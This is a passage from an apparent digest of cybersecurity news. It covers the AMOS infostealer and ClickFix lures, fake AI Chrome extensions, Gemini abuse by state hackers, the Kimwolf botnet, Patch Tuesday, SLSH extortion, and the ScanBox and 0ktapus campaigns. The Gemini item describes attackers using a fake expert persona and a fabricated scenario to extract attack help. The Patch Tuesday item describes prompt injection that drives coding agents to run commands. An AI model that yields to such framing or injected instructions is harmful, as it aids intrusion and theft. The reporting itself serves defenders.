For instance, below you can see that a Russian-speaking threat actor dealing with Crypto wallet theft is looking for relevant AMOS logs.

Traditionally, AMOS is disseminated like every known and popular infostealers, such as phishing links, phishing emails, trojanized installers, and click baits, but throughout recent years we have also seen some more noticeable campaigns.

Targeting LastPass Users

In an underground forum, we saw a post about LastPass that warned of an ongoing AMOS campaign.

This campaign was targeting macOS users through fake applications distributed via fraudulent GitHub repositories, where attackers impersonate over 100 well-known software brands to increase legitimacy.

The operation relies on SEO poisoning across Google and Bing to push these malicious repositories into search results, ultimately leading victims to ClickFix-style pages that socially engineer them into pasting Terminal commands, which download and execute the AMOS payload.

The campaign is particularly resilient because attackers continuously generate new GitHub repositories using automated account creation, highlighting how trusted developer platforms and search engines are increasingly abused as scalable malware distribution infrastructure.

AI-Driven Dissemination Channels

ClawHavoc wasn’t AMOS’s first AI campaign. In December 2025, Huntress reported that AMOS is targeting ChatGPT users. The threat actors used the ChatGPT shared chat feature to host malicious “installation guides” directly on a trusted domain (chatgpt.com), making the lure significantly more convincing.

Victims are driven there mainly via paid search ads (SEO poisoning/malvertising) promoting a fake “ChatGPT Atlas browser for macOS”, then instructed to run a one-line terminal command, effectively turning the user into the execution mechanism.

This example shows yet again that threat actors are weaponizing AI content hype as part of their malware distribution.

Traditional Dissemination Channels

Modern macOS infostealer campaigns rely heavily on social engineering–driven distribution rather than technical exploits. Threat actors commonly create fake installers for popular software such as Tor Browser, Photoshop, or Microsoft Office, packaging malware inside realistic-looking DMG disk images.

In parallel, they use malvertising through platforms like Google Ads to drive victims to spoofed download sites that closely mimic legitimate vendors.

For example, users searching for legitimate software may be redirected to look-alike domains hosting malicious installers that silently deploy stealers such as AMOS.

Another growing tactic is the use of instruction-based execution techniques (often called ClickFix), where victims are guided to run commands themselves in the macOS Terminal.

Instead of exploiting system vulnerabilities, attackers rely on convincing installation instructions, which ultimately execute the malware payload. For instance, asking users to drag files into Terminal or paste commands.

Together, these methods reflect a shift toward abusing user trust, brand impersonation, and legitimate distribution channels to bypass traditional security controls and increase infection success rates.

The Underground Economy Model

The AMOS ecosystem operates as a structured Malware-as-a-Service (MaaS) supply chain, where the developers (often tracked in underground forums as AMOS sellers or affiliates) provide the stealer platform, updates, infrastructure components, and sometimes management panels for a subscription cost historically advertised around ~$1,000 per month, typically paid in cryptocurrency.

Downstream threat actors purchase access to the stealer kit, customize lures or distribution channels (malvertising, fake installers, phishing, SEO poisoning, supply-chain abuse, or social engineering campaigns), and focus on maximizing infection volume.

The primary output is a list of stolen credentials, PII, and session logs. This becomes a tradable commodity in underground markets.

These stealer logs are purchased by secondary actors such as access brokers, account takeover specialists, and crypto cash-out operators, who use them for follow-on operations, including SaaS account compromise, financial fraud, ransomware initial access, or cryptocurrency theft.

This multi-stage monetization model turns AMOS infections into a repeatable revenue pipeline, where each actor in the chain specializes in development, distribution, or monetization, reflecting the broader industrialization of the modern infostealer economy.

Unlike traditional malware that focuses on persistence, defense evasion, lateral movement, or destruction, infostealers prioritize speed, data coverage, and stealth, allowing attackers to quickly convert stolen data into usable access.

The resulting “stealer logs” are then sold or traded in underground markets, where other threat actors use them for account takeover, lateral movement, fraud, or follow-on attacks, defacto making infostealers a foundational data-supply layer for the broader cybercrime economy.

The distributor layer is where we typically see the “innovative” or “creative” side of these campaigns - and it’s what usually makes the headlines. This is the layer behind narratives like “AMOS is now targeting AI apps” or “AMOS campaigns are hitting LastPass users.”

In reality, the core malware developers often remain consistent, occasionally adding a new feature or improving packaging and evasion, but the underlying capability set changes incrementally.

The downstream log consumers also tend to operate with established, repeatable monetization techniques.

The distributors, however, are the ones driving real campaign evolution: they decide who to target, define campaign scope, choose distribution channels, and continuously refine the psychological and social engineering techniques used to manipulate victims as part of their operational playbook.

[5] BleepingComputer - Fake AI Chrome extensions with 300K users steal credentials, emails
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 08:41:55 -0500
Link: https://www.bleepingcomputer.com/news/security/fake-ai-chrome-extensions-with-300k-users-steal-credentials-emails/

[TAM METİN - 607 kelime]
A set of 30 malicious Chrome extensions that have been installed by more than 300,000 users are masquerading as AI assistants to steal credentials, email content, and browsing information.

Some of the extensions are still present in the Chrome Web Store and have been installed by tens of thousands of users, while others show a small install count.

Researchers at browser security platform LayerX discovered the malicious extension campaign and named it AiFrame. They found that all analyzed extensions are part of the same malicious effort as they communicate with infrastructure under a single domain, tapnetic[.]pro.

According to them, the most popular extension in the AiFrame campaign had 80,000 users and was called Gemini AI Sidebar (fppbiomdkfbhgjjdmojlogeceejinadg), but it is no longer on the Chrome Web Store.

However, BleepingComputer found that other extensions with thousands of users are still present on Google's repository for Chrome extensions. It should be noted that the names may be different in some cases, but the identification is the same.

AI Sidebar (gghdfkafnhfpaooiolhncejnlgglhkhe) – 70,000 users

AI Assistant (nlhpidbjmmffhoogcennoiopekbiglbp) – 60,000 users

ChatGPT Translate (acaeafediijmccnjlokgcdiojiljfpbe) – 30,000 users

AI GPT (kblengdlefjpjkekanpoidgoghdngdgl) – 20,000 users

ChatGPT (llojfncgbabajmdglnkbhmiebiinohek) – 20,000 users

AI Sidebar (djhjckkfgancelbmgcamjimgphaphjdl) – 10,000 users

Google Gemini (fdlagfnfaheppaigholhoojabfaapnhb) – 10,000 users

LayerX found that all 30 extensions share the same internal structure, JavaScript logic, permissions, and backend infrastructure.

The malicious browser add-ons do not implement AI functionality locally; instead, they deliver the promised feature by rendering a full-screen iframe to load content from a remote domain.

This, by itself, is risky, as publishers can change the extensions’ logic at any time without pushing an update - just like in the case of Microsoft Office Add-ins - thus avoiding a new review.

In the background, the extensions extract page content from websites the user visits, including sensitive authentication pages, using Mozilla’s Readability library.

LayerX says that a subset of 15 extensions specifically targets Gmail data, using a dedicated content script that runs at ‘document_start’ on ‘mail.google.com’ and injects UI elements.

The script reads visible email content directly from the DOM and repeatedly extracts email thread text via ‘.textContent.’ The researchers note that even email drafts can be captured.

“When Gmail-related features such as AI-assisted replies or summaries are invoked, the extracted email content is passed into the extension’s logic and transmitted to third-party backend infrastructure controlled by the extension operator,” LayerX explains in a report today.

“As a result, email message text and related contextual data may be sent off-device, outside of Gmail’s security boundary, to remote servers.”

The extensions also feature a remotely triggered voice recognition and transcript generation mechanism using the ‘Web Speech API,’ returning the results to the operators. Depending on the granted permissions, the extensions may even siphon conversations from the victim’s environment.

BleepingComputer has contacted Google for a comment on LayerX findings, but we have not received a response by publication time.

It is recommended to check LayerX's list of indicators of compromise for the complete set of malicious extensions. If compromise is confirmed, users should reset passwords for all accounts.

[6] BleepingComputer - Google says hackers are abusing Gemini AI for all attacks stages
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 02:00:00 -0500
Link: https://www.bleepingcomputer.com/news/security/google-says-hackers-are-abusing-gemini-ai-for-all-attacks-stages/

[TAM METİN - 770 kelime]
State-backed hackers are using Google's Gemini AI model to support all stages of an attack, from reconnaissance to post-compromise actions.

Bad actors from China (APT31, Temp.HEX), Iran (APT42), North Korea (UNC2970), and Russia used Gemini for target profiling and open-source intelligence, generating phishing lures, translating text, coding, vulnerability testing, and troubleshooting.

Cybercriminals are also showing increased interest in AI tools and services that could help in illegal activities, such as social engineering ClickFix campaigns.

AI-enhanced malicious activity

The Google Threat Intelligence Group (GTIG) notes in a report today that APT adversaries use Gemini to support their campaigns "from reconnaissance and phishing lure creation to command and control  (C2) development and data exfiltration."

Chinese threat actors employed an expert cybersecurity persona to request that Gemini automate vulnerability analysis and provide targeted testing plans in the context of a fabricated scenario.

“The PRC-based threat actor fabricated a scenario, in one case trialing Hexstrike MCP tooling, and directing the model to analyze Remote Code Execution (RCE), WAF bypass techniques, and SQL injection test results against specific US-based targets,” Google says.

Another China-based actor frequently employed Gemini to fix their code, carry out research, and provide advice on technical capabilities for intrusions.

The Iranian adversary APT42 leveraged Google's LLM for social engineering campaigns, as a development platform to speed up the creation of tailored malicious tools (debugging, code generation, and researching exploitation techniques).

Additional threat actor abuse was observed for implementing new capabilities into existing malware families, including the CoinBait phishing kit and the HonestCue malware downloader and launcher.

GTIG notes that no major breakthroughs have occurred in that respect, though the tech giant expects malware operators to continue to integrate AI capabilities into their toolsets.

HonestCue is a proof-of-concept malware framework observed in late 2025 that uses the Gemini API to generate C# code for second-stage malware, then compiles and executes the payloads in memory.

CoinBait is a React SPA-wrapped phishing kit masquerading as a cryptocurrency exchange for credential harvesting. It contains artifacts indicating that its development was advanced using AI code generation tools.

One indicator of LLM use is logging messages in the malware source code that were prefixed with "Analytics:," which could help defenders track data exfiltration processes.

Based on the malware samples, GTIG researchers believe that the malware was created using the Lovable AI platform, as the developer used the Lovable Supabase client and lovable.app.

Cybercriminals also used generative AI services in ClickFix campaigns, delivering the AMOS info-stealing malware for macOS. Users were lured to execute malicious commands through malicious ads listed in search results for queries on troubleshooting specific issues.

The report further notes that Gemini has faced AI model extraction and distillation attempts, with organizations leveraging authorized API access to methodically query the system and reproduce its decision-making processes to replicate its functionality.

Although the problem is not a direct threat to users of these models or their data, it constitutes a significant commercial, competitive, and intellectual property problem for the creators of these models.

Essentially, actors take information obtained from one model and transfer the information to another using a machine learning technique called "knowledge distillation," which is used to train fresh models from more advanced ones.

“Model extraction and subsequent knowledge distillation enable an attacker to accelerate AI model development quickly and at a significantly lower cost,” GTIG researchers say.

Google flags these attacks as a threat because they constitute intellectual theft, they are scalable, and severely undermine the business model of AI-as-a-service, which has the potential to impact end users soon.

In a large-scale attack of this kind, Gemini AI was targeted by 100,000 prompts that posed a series of questions aimed at replicating the model’s reasoning across a range of tasks in non-English languages.

Google has disabled accounts and infrastructure tied to documented abuse, and has implemented targeted defenses in Gemini’s classifiers to make abuse harder.

The company assures that it "designs AI systems with robust security measures and strong safety guardrails" and regularly tests the models to improve their security and safety.

[7] Krebs on Security - Kimwolf Botnet Swamps Anonymity Network I2P
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 11 Feb 2026 16:08:11 +0000
Link: https://krebsonsecurity.com/2026/02/kimwolf-botnet-swamps-anonymity-network-i2p/

[TAM METİN - 831 kelime]
For the past week, the massive “Internet of Things” (IoT) botnet known as Kimwolf has been disrupting The Invisible Internet Project (I2P), a decentralized, encrypted communications network designed to anonymize and secure online communications. I2P users started reporting disruptions in the network around the same time the Kimwolf botmasters began relying on it to evade takedown attempts against the botnet’s control servers.

Kimwolf is a botnet that surfaced in late 2025 and quickly infected millions of systems, turning poorly secured IoT devices like TV streaming boxes, digital picture frames and routers into relays for malicious traffic and abnormally large distributed denial-of-service (DDoS) attacks.

I2P is a decentralized, privacy-focused network that allows people to communicate and share information anonymously.

“It works by routing data through multiple encrypted layers across volunteer-operated nodes, hiding both the sender’s and receiver’s locations,” the I2P website explains. “The result is a secure, censorship-resistant network designed for private websites, messaging, and data sharing.”

On February 3, I2P users began complaining on the organization’s GitHub page about tens of thousands of routers suddenly overwhelming the network, preventing existing users from communicating with legitimate nodes. Users reported a rapidly increasing number of new routers joining the network that were unable to transmit data, and that the mass influx of new systems had overwhelmed the network to the point where users could no longer connect.

I2P users complaining about service disruptions from a rapidly increasing number of routers suddenly swamping the network.

When one I2P user asked whether the network was under attack, another user replied, “Looks like it. My physical router freezes when the number of connections exceeds 60,000.”

A graph shared by I2P developers showing a marked drop in successful connections on the I2P network around the time the Kimwolf botnet started trying to use the network for fallback communications.

The same day that I2P users began noticing the outages, the individuals in control of Kimwolf posted to their Discord channel that they had accidentally disrupted I2P after attempting to join 700,000 Kimwolf-infected bots as nodes on the network.

The Kimwolf botmaster openly discusses what they are doing with the botnet in a Discord channel with my name on it.

Although Kimwolf is known as a potent weapon for launching DDoS attacks, the outages caused this week by some portion of the botnet attempting to join I2P are what’s known as a “Sybil attack,” a threat in peer-to-peer networks where a single entity can disrupt the system by creating, controlling, and operating a large number of fake, pseudonymous identities.

Indeed, the number of Kimwolf-infected routers that tried to join I2P this past week was many times the network’s normal size. I2P’s Wikipedia page says the network consists of roughly 55,000 computers distributed throughout the world, with each participant acting as both a router (to relay traffic) and a client.

However, Lance James, founder of the New York City based cybersecurity consultancy Unit 221B and the original founder of I2P, told KrebsOnSecurity the entire I2P network now consists of between 15,000 and 20,000 devices on any given day.

An I2P user posted this graph on Feb. 10, showing tens of thousands of routers — mostly from the United States — suddenly attempting to join the network.

Benjamin Brundage is founder of Synthient, a startup that tracks proxy services and was the first to document Kimwolf’s unique spreading techniques. Brundage said the Kimwolf operator(s) have been trying to build a command and control network that can’t easily be taken down by security companies and network operators that are working together to combat the spread of the botnet.

Brundage said the people in control of Kimwolf have been experimenting with using I2P and a similar anonymity network — Tor — as a backup command and control network, although there have been no reports of widespread disruptions in the Tor network recently.

“I don’t think their goal is to take I2P down,” he said. “It’s more they’re looking for an alternative to keep the botnet stable in the face of takedown attempts.”

The Kimwolf botnet created challenges for Cloudflare late last year when it began instructing millions of infected devices to use Cloudflare’s domain name system (DNS) settings, causing control domains associated with Kimwolf to repeatedly usurp Amazon, Apple, Google and Microsoft in Cloudflare’s public ranking of the most frequently requested websites.

James said the I2P network is still operating at about half of its normal capacity, and that a new release is rolling out which should bring some stability improvements over the next week for users.

Meanwhile, Brundage said the good news is Kimwolf’s overlords appear to have quite recently alienated some of their more competent developers and operators, leading to a rookie mistake this past week that caused the botnet’s overall numbers to drop by more than 600,000 infected systems.

“It seems like they’re just testing stuff, like running experiments in production,” he said. “But the botnet’s numbers are dropping significantly now, and they don’t seem to know what they’re doing.”

[8] Krebs on Security - Patch Tuesday, February 2026 Edition
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 515 kelime]
Microsoft today released updates to fix more than 50 security holes in its Windows operating systems and other software, including patches for a whopping six “zero-day” vulnerabilities that attackers are already exploiting in the wild.

Zero-day #1 this month is CVE-2026-21510, a security feature bypass vulnerability in Windows Shell wherein a single click on a malicious link can quietly bypass Windows protections and run attacker-controlled content without warning or consent dialogs. CVE-2026-21510 affects all currently supported versions of Windows.

The zero-day flaw CVE-2026-21513 is a security bypass bug targeting MSHTML, the proprietary engine of the default Web browser in Windows. CVE-2026-21514 is a related security feature bypass in Microsoft Word.

The zero-day CVE-2026-21533 allows local attackers to elevate their user privileges to “SYSTEM” level access in Windows Remote Desktop Services. CVE-2026-21519 is a zero-day elevation of privilege flaw in the Desktop Window Manager (DWM), a key component of Windows that organizes windows on a user’s screen. Microsoft fixed a different zero-day in DWM just last month.

The sixth zero-day is CVE-2026-21525, a potentially disruptive denial-of-service vulnerability in the Windows Remote Access Connection Manager, the service responsible for maintaining VPN connections to corporate networks.

Chris Goettl at Ivanti reminds us Microsoft has issued several out-of-band security updates since January’s Patch Tuesday. On January 17, Microsoft pushed a fix that resolved a credential prompt failure when attempting remote desktop or remote application connections. On January 26, Microsoft patched a zero-day security feature bypass vulnerability (CVE-2026-21509) in Microsoft Office.

Kev Breen at Immersive notes that this month’s Patch Tuesday includes several fixes for remote code execution vulnerabilities affecting GitHub Copilot and multiple integrated development environments (IDEs), including VS Code, Visual Studio, and JetBrains products. The relevant CVEs are CVE-2026-21516, CVE-2026-21523, and CVE-2026-21256.

Breen said the AI vulnerabilities Microsoft patched this month stem from a command injection flaw that can be triggered through prompt injection, or tricking the AI agent into doing something it shouldn’t — like executing malicious code or commands.

“Developers are high-value targets for threat actors, as they often have access to sensitive data such as API keys and secrets that function as keys to critical infrastructure, including privileged AWS or Azure API keys,” Breen said. “When organizations enable developers and automation pipelines to use LLMs and agentic AI, a malicious prompt can have significant impact. This does not mean organizations should stop using AI. It does mean developers should understand the risks, teams should clearly identify which systems and workflows have access to AI agents, and least-privilege principles should be applied to limit the blast radius if developer secrets are compromised.”

The SANS Internet Storm Center has a clickable breakdown of each individual fix this month from Microsoft, indexed by severity and CVSS score. Enterprise Windows admins involved in testing patches before rolling them out should keep an eye on askwoody.com, which often has the skinny on wonky updates. Please don’t neglect to back up your data if it has been a while since you’ve done that, and feel free to sound off in the comments if you experience problems installing any of these fixes.

[9] Krebs on Security - Please Don’t Feed the Scattered Lapsus ShinyHunters
────────────────────────────────────────────────────────────────────────────────
Tarih: Mon, 02 Feb 2026 16:15:16 +0000

[TAM METİN - 1200 kelime]
A prolific data ransom gang that calls itself Scattered Lapsus ShinyHunters (SLSH) has a distinctive playbook when it seeks to extort payment from victim firms: Harassing, threatening and even swatting executives and their families, all while notifying journalists and regulators about the extent of the intrusion. Some victims reportedly are paying — perhaps as much to contain the stolen data as to stop the escalating personal attacks. But a top SLSH expert warns that engaging at all beyond a “We’re not paying” response only encourages further harassment, noting that the group’s fractious and unreliable history means the only winning move is not to pay.

Image: Shutterstock.com, @Mungujakisa

Unlike traditional, highly regimented Russia-based ransomware affiliate groups, SLSH is an unruly and somewhat fluid English-language extortion gang that appears uninterested in building a reputation of consistent behavior whereby victims might have some measure of confidence that the criminals will keep their word if paid.

That’s according to Allison Nixon, director of research at the New York City based security consultancy Unit 221B. Nixon has been closely tracking the criminal group and individual members as they bounce between various Telegram channels used to extort and harass victims, and she said SLSH differs from traditional data ransom groups in other important ways that argue against trusting them to do anything they say they’ll do — such as destroying stolen data.

Like SLSH, many traditional Russian ransomware groups have employed high-pressure tactics to force payment in exchange for a decryption key and/or a promise to delete stolen data, such as publishing a dark web shaming blog with samples of stolen data next to a countdown clock, or notifying journalists and board members of the victim company. But Nixon said the extortion from SLSH quickly escalates way beyond that — to threats of physical violence against executives and their families, DDoS attacks on the victim’s website, and repeated email-flooding campaigns.

SLSH is known for breaking into companies by phishing employees over the phone, and using the purloined access to steal sensitive internal data. In a January 30 blog post, Google’s security forensics firm Mandiant said SLSH’s most recent extortion attacks stem from incidents spanning early to mid-January 2026, when SLSH members pretended to be IT staff and called employees at targeted victim organizations claiming that the company was updating MFA settings.

“The threat actor directed the employees to victim-branded credential harvesting sites to capture their SSO credentials and MFA codes, and then registered their own device for MFA,” the blog post explained.

Victims often first learn of the breach when their brand name is uttered on whatever ephemeral new public Telegram group chat SLSH is using to threaten, extort and harass their prey. According to Nixon, the coordinated harassment on the SLSH Telegram channels is part of a well-orchestrated strategy to overwhelm the victim organization by manufacturing humiliation that pushes them over the threshold to pay.

Nixon said multiple executives at targeted organizations have been subject to “swatting” attacks, wherein SLSH communicated a phony bomb threat or hostage situation at the target’s address in the hopes of eliciting a heavily armed police response at their home or place of work.

“A big part of what they’re doing to victims is the psychological aspect of it, like harassing executives’ kids and threatening the board of the company,” Nixon told KrebsOnSecurity. “And while these victims are getting extortion demands, they’re simultaneously getting outreach from media outlets saying, ‘Hey, do you have any comments on the bad things we’re going to write about you.”

In a blog post today, Unit 221B argues that no one should negotiate with SLSH because the group has demonstrated a willingness to extort victims based on promises that it has no intention to keep. Nixon points out that all of SLSH’s known members hail from The Com, shorthand for a constellation of cybercrime-focused Discord and Telegram communities which serve as a kind of distributed social network that facilitates instant collaboration.

Nixon said Com-based extortion groups tend to instigate feuds and drama between group members, leading to lying, betrayals, credibility destroying behavior, backstabbing, and sabotaging each other.

“With this type of ongoing dysfunction, often compounding by substance abuse, these threat actors often aren’t able to act with the core goal in mind of completing a successful, strategic ransom operation,” Nixon wrote. “They continually lose control with outbursts that put their strategy and operational security at risk, which severely limits their ability to build a professional, scalable, and sophisticated criminal organization network for continued successful ransoms – unlike other, more tenured and professional criminal organizations focused on ransomware alone.”

Intrusions from established ransomware groups typically center around encryption/decryption malware that mostly stays on the affected machine. In contrast, Nixon said, ransom from a Com group is often structured the same as violent sextortion schemes against minors, wherein members of The Com will steal damaging information, threaten to release it, and “promise” to delete it if the victim complies without any guarantee or technical proof point that they will keep their word. She writes:

A key component of SLSH’s efforts to convince victims to pay, Nixon said, involves manipulating the media into hyping the threat posed by this group. This approach also borrows a page from the playbook of sextortion attacks, she said, which encourages predators to keep targets continuously engaged and worrying about the consequences of non-compliance.

“On days where SLSH had no substantial criminal ‘win’ to announce, they focused on announcing death threats and harassment to keep law enforcement, journalists, and cybercrime industry professionals focused on this group,” she said.

Nixon knows a thing or two about being threatened by SLSH: For the past several months, the group’s Telegram channels have been replete with threats of physical violence against her, against Yours Truly, and against other security researchers. These threats, she said, are just another way the group seeks to generate media attention and achieve a veneer of credibility, but they are useful as indicators of compromise because SLSH members tend to name drop and malign security researchers even in their communications with victims.

“Watch for the following behaviors in their communications to you or their public statements,” Unit 221B’s advisory reads. “Repeated abusive mentions of Allison Nixon (or “A.N”), Unit 221B, or cybersecurity journalists—especially Brian Krebs—or any other cybersecurity employee, or cybersecurity company. Any threats to kill, or commit terrorism, or violence against internal employees, cybersecurity employees, investigators, and journalists.”

Unit 221B says that while the pressure campaign during an extortion attempt may be traumatizing to employees, executives, and their family members, entering into drawn-out negotiations with SLSH incentivizes the group to increase the level of harm and risk, which could include the physical safety of employees and their families.

“The breached data will never go back to the way it was, but we can assure you that the harassment will end,” Nixon said. “So, your decision to pay should be a separate issue from the harassment. We believe that when you separate these issues, you will objectively see that the best course of action to protect your interests, in both the short and long term, is to refuse payment.”

[10] Threatpost - Student Loan Breach Exposes 2.5M Records
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 31 Aug 2022 12:57:48 +0000
Link: https://threatpost.com/student-loan-breach-exposes-2-5m-records/180492/

[TAM METİN - 511 kelime]
2.5 million people were affected, in a breach that could spell more trouble down the line.

EdFinancial and the Oklahoma Student Loan Authority (OSLA) are notifying over 2.5 million loanees that their personal data was exposed in a data breach.

The target of the breach was Nelnet Servicing, the Lincoln, Neb.-based servicing system and web portal provider for OSLA and EdFinancial, according to a breach disclosure letter.

Nelnet revealed the breach to affected loan recipients on July 21, 2022 via a letter.

“[Our] cybersecurity team took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched[sic] an investigation with third-party forensic experts to determine the nature and scope of the activity,” according to the letter.

By August 17th, the investigation determined that personal user information was accessed by an unauthorized party. That exposed information included names, home addresses, email addresses, phone numbers and social security numbers for a total of 2,501,324 student loan account holders. Users’ financial information was not exposed.

According to a breach disclosure filing submitted by Nelnet’s general counsel, Bill Munn, to the state of Maine the breach occurred sometime between June 1, 2022 and July 22, 2022. However, a letter to affected customers pinpoints the breach to July 21. The breach was discovered on August 17, 2022.

“On July 21, 2022, Nelnet Servicing, LLC (Nelnet), our servicing system and customer website

portal provider, notified us that they had discovered a vulnerability that we believe led to this incident,” according to the Nelnet.

It’s unclear what the vulnerability was.

“On August 17, 2022, this investigation determined that certain student loan account registration information was accessible by an unknown party beginning in June 2022 and ending on July 22, 2022,” according to the letter.

Loan Recipient Targets

Although users’ most sensitive financial data was protected, the personal information that was accessed in the Nelnet breach “has potential to be leveraged in future social engineering and phishing campaigns,” explained Melissa Bischoping, endpoint security research specialist at Tanium, in a statement via email.

“With recent news of student loan forgiveness, it’s reasonable to expect the occasion to be used by scammers as a gateway for criminal activity,” Bischoping said.

Last week, the Biden administration announced a plan to cancel $10,000 of student loan debt for low- and middle-income loanees. She said the loan forgiveness program will be used to lure victims into opening up phishing emails.

She warns that recently breached data will be used to impersonate affected brands in waves of phishing campaigns targeting students and recent college graduates.

“Because they can leverage the trust from existing business relationships they can be particularly deceptive,” she wrote.

According to the breach disclosure Nelnet Servicing informed Edfinancial and OSLA that Nelnet Servicing’s cybersecurity team “took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched an investigation with third-party forensic experts to determine the nature and scope of the activity.”

Remediation also included two years of free credit monitoring, credit reports and up to $1 million in identity theft insurance.

[11] Threatpost - Watering Hole Attacks Push ScanBox Keylogger

Researchers uncover a watering hole attack likely carried out by APT TA423, which attempts to plant the ScanBox JavaScript-based reconnaissance tool.

A China-based threat actor has ramped up efforts to distribute the ScanBox reconnaissance framework to victims that include domestic Australian organizations and offshore energy firms in the South China Sea. The bait used by the advanced threat group (APT) is targeted messages that supposedly link back to Australian news websites.

The cyber-espionage campaigns are believed to have launched April 2022 through mid-June 2022, according to a Tuesday report by Proofpoint’s Threat Research Team and PwC’s Threat Intelligence team.

The threat actor, according to researchers, is believed to be the China-based APT TA423, also known as Red Ladon. “Proofpoint assesses with moderate confidence that this activity may be attributable to the threat actor TA423 / Red Ladon, which multiple reports assess to operate out of Hainan Island, China,” according to the report.

The APT is most recently known for a recent indictment. “A 2021 indictment by the US Department of Justice assessed that TA423 / Red Ladon provides long-running support to the Hainan Province Ministry of State Security (MSS),” researchers said.

MSS is the civilian intelligence, security and cyber police agency for the People’s Republic of China. It is believed responsible for counter-intelligence, foreign intelligence, political security and tied to industrial and cyber espionage efforts by China.

Dusting Off the ScanBox

The campaign leverages the ScanBox framework. ScanBox is a customizable and multifunctional Javascript-based framework used by adversaries to conducting covert reconnaissance.

ScanBox has been used by adversaries for nearly a decade and is noteworthy because criminals can use the tool to conduct counter intelligence without having to plant malware on a targets system.

“ScanBox is particularly dangerous as it doesn’t require malware to be successfully deployed to disk in order to steal information – the keylogging functionality simply requires the JavaScript code to be executed by a web browser,” according to PwC researchers referring to a previous campaign.

In lieu of malware, attackers can use ScanBox in conjunction with watering hole attacks. Adversaries load the malicious JavaScript onto a compromised website where the ScanBox acts as a keylogger snagging all of a user’s typed activity on the infected watering hole website.

TA423’s attacks began with phishing emails, with such titles as “Sick Leave,” “User Research” and “Request Cooperation.” Often, the emails purported to come from an employee of the “Australian Morning News,” a fictional organization. The employee implored targets to visit their “humble news website,” australianmorningnews[.]com.

“Upon clicking the link and redirecting to the site, visitors were served the ScanBox framework,” researchers wrote.

The link directed targets to a web page with content copied from actual news sites, like the BBC and Sky News. In the process, it also delivered the ScanBox malware framework.

ScanBox keylogger data culled from waterholes is part of a multi-stage attack, giving attackers insight into the potential targets that will help them launch future attacks against them. This technique is often called browser fingerprinting.

The primary, initial script sources a list of information about the target computer, including the operating system, language and version of Adobe Flash installed. ScanBox additionally runs a check for browser extensions, plugins and components such WebRTC.

“The module implements WebRTC, a free and open-source technology supported on all major browsers, which allows web browsers and mobile applications to perform real-time communication (RTC) over application programming interfaces (APIs). This allows ScanBox to connect to a set of pre-configured targets,” researchers explain.

Adversaries can then leverage a technology called STUN (Session Traversal Utilities for NAT). This is a standardized set of methods, including a network protocol, that allows interactive communications (including real-time voice, video, and messaging applications) to traverse network address translator (NAT) gateways, researchers explain.

“STUN is supported by the WebRTC protocol. Through a third-party STUN server located on the Internet, it allows hosts to discover the presence of a NAT, and to discover the mapped IP address and port number that the NAT has allocated for the application’s User Datagram Protocol (UDP) flows to remote hosts. ScanBox implements NAT traversal using STUN servers as part of Interactive Connectivity Establishment (ICE), a peer-to-peer communication method used for clients to communicate as directly as possible, avoiding having to communicate through NATs, firewalls, or other solutions,” according to researchers.

“This means that the ScanBox module can set up ICE communications to STUN servers, and communicate with victim machines even if they are behind NAT,” they explain.

The threat actors “support the Chinese government in matters related to the South China Sea, including during the recent tensions in Taiwan,” Sherrod DeGrippo, vice president of threat research and detection at Proofpoint, explained in a statement, “This group specifically wants to know who is active in the region and, while we can’t say for certain, their focus on naval issues is likely to remain a constant priority in places like Malaysia, Singapore, Taiwan, and Australia.”

The group has, in the past, expanded well beyond Australasia. According to a Department of Justice indictment from July, 2021, the group has “stolen trade secrets and confidential business information” from victims in “the United States, Austria, Cambodia, Canada, Germany, Indonesia, Malaysia, Norway, Saudi Arabia, South Africa, Switzerland and the United Kingdom. Targeted industries included, among others, aviation, defense, education, government, health care, biopharmaceutical and maritime.”

Despite the DoJ indictment, analysts “have not observed a distinct disruption of operational tempo” from TA423, and they “collectively expect TA423 / Red Ladon to continue pursuing its intelligence-gathering and espionage mission.”

[12] Threatpost - Tentacles of ‘0ktapus’ Threat Group Victimize 130 Firms
────────────────────────────────────────────────────────────────────────────────
Tarih: Mon, 29 Aug 2022 14:56:19 +0000
Link: https://threatpost.com/0ktapus-victimize-130-firms/180487/

[TAM METİN - 614 kelime]
Over 130 companies tangled in sprawling phishing campaign that spoofed a multi-factor authentication system.

Targeted attacks on Twilio and Cloudflare employees are tied to a massive phishing campaign that resulted in 9,931 accounts at over 130 organizations being compromised. The campaigns are tied to focused abuse of identity and access management firm Okta, which gained the threat actors the 0ktapus moniker, by researchers.

“The primary goal of the threat actors was to obtain Okta identity credentials and multi-factor authentication (MFA) codes from users of the targeted organizations,” wrote Group-IB researchers in a recent report. “These users received text messages containing links to phishing sites that mimicked the Okta authentication page of their organization.”

Impacted were 114 US-based firms, with additional victims of sprinkled across 68 additional countries.

Roberto Martinez, senior threat intelligence analyst at Group-IB, said the scope of the attacks is still an unknown. “The 0ktapus campaign has been incredibly successful, and the full scale of it may not be known for some time,” he said.

What the 0ktapus Hackers Wanted

The 0ktapus attackers are believed to have begun their campaign by targeting telecommunications companies in hopes of winning access to potential targets’ phone numbers.

While unsure exactly how threat actors obtained a list of phone numbers used in MFA-related attacks, one theory researchers posit is that 0ktapus attackers began their campaign targeting telecommunications companies.

“[A]ccording to the compromised data analyzed by Group-IB, the threat actors started their attacks by targeting mobile operators and telecommunications companies and could have collected the numbers from those initial attacks,” researchers wrote.

Next, attackers sent phishing links to targets via text messages. Those links led to webpages mimicking the Okta authentication page used by the target’s employer. Victims were then asked to submit Okta identity credentials in addition to a multi-factor authentication (MFA) codes employees used to secure their logins.

In an accompanying technical blog, researchers at Group-IB explain that the initial compromises of mostly software-as-a-service firms were a phase-one in a multi-pronged attack. 0ktapus’ ultimate goal was to access company mailing lists or customer-facing systems in hopes of facilitating supply-chain attacks.

In a possible related incident, within hours of Group-IB publishing its report late last week, the firm DoorDash revealed it was targeted in an attack with all the hallmarks of an 0ktapus-style attack.

Blast Radius: MFA Attacks

In a blog post DoorDash revealed; “unauthorized party used the stolen credentials of vendor employees to gain access to some of our internal tools.” The attackers, according to the post, went on to steal personal information – including names, phone numbers, email and delivery addresses – from customers and delivery people.

In the course of its campaign, the attacker compromised 5,441 MFA codes, Group-IB reported.

